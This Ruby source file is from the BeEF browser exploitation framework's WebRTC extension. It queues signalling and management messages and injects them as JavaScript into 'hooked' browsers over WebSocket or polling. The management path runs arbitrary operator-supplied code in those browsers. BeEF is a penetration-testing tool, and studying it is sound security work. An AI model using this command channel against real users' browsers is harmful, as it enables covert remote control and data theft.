#
# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#

# A lot of this logic is cloned from the requester extension, which had a sane way of sending/recvng 
# JS to the clients.. 

module BeEF
  module Extension
    module WebRTC
      module API

        require 'uri'
        class Hook

          include BeEF::Core::Handlers::Modules::BeEFJS

          # If the Rtcsignal table contains requests that need to be sent (has_sent = waiting), retrieve
          # and send them to the hooked browser.
          # Don't forget, these are signalling messages for a peer, so we don't check that the request
          # is for the hooked_browser_id, but the target

          # This logic also checks the Rtc
          def requester_run(hb, body)
            @body = body
            rtcsignaloutput = []
            rtcmanagementoutput = []

            # Get all RTCSignals for this browser
            BeEF::Core::Models::Rtcsignal.all(:target_hooked_browser_id => hb.id, :has_sent => "waiting").each { |h|
              # output << self.requester_parse_db_request(h)
              rtcsignaloutput << h.signal
              h.has_sent = "sent"
              h.save
            }

            # Get all RTCManagement messages for this browser
            BeEF::Core::Models::Rtcmanage.all(:hooked_browser_id => hb.id, :has_sent => "waiting").each {|h|
              rtcmanagementoutput << h.message
              h.has_sent = "sent"
              h.save
            }

            # Return if we have no new data to add to hook.js
            return if rtcsignaloutput.empty? and rtcmanagementoutput.empty?

            config = BeEF::Core::Configuration.instance
            ws = BeEF::Core::Websocket::Websocket.instance

            # todo antisnatchor: prevent sending "content" multiple times. Better leaving it after the first run, and don't send it again.
            #todo antisnatchor: remove this gsub crap adding some hook packing.
            # The below is how antisnatchor was managing insertion of messages dependent on WebSockets or not
            # Hopefully this still works
            if config.get("beef.http.websocket.enable") && ws.getsocket(hb.session)
              
              rtcsignaloutput.each {|o|
                add_rtcsignal_to_body o
              } unless rtcsignaloutput.empty?
              rtcmanagementoutput.each {|o|
                add_rtcmanagement_to_body o
              } unless rtcmanagementoutput.empty?
              # ws.send(content + @body,hb.session)
              ws.send(@body,hb.session)
               #if we use WebSockets, just reply wih the component contents
            else # if we use XHR-polling, add the component to the main hook file
              rtcsignaloutput.each {|o|
                add_rtcsignal_to_body o
              } unless rtcsignaloutput.empty?
              rtcmanagementoutput.each {|o|
                add_rtcmanagement_to_body o
              } unless rtcmanagementoutput.empty?
            end

          end

          def add_rtcsignal_to_body(output)
            @body << %Q{
              beef.execute(function() {
                var peerid = null;
                for (k in beefrtcs) {
                  if (beefrtcs[k].allgood === false) {
                    peerid = beefrtcs[k].peerid;
                  }
                }
                if (peerid == null) {
                  console.log('received a peer message, but, we are already setup?');
                } else {
                  beefrtcs[peerid].processMessage(
                    JSON.stringify(#{output})
                  );
                }
              });
            }
          end

          def add_rtcmanagement_to_body(output)
            @body << %Q{
              beef.execute(function() {
                #{output}
              });
            }
          end

        end
      end
    end
  end
end
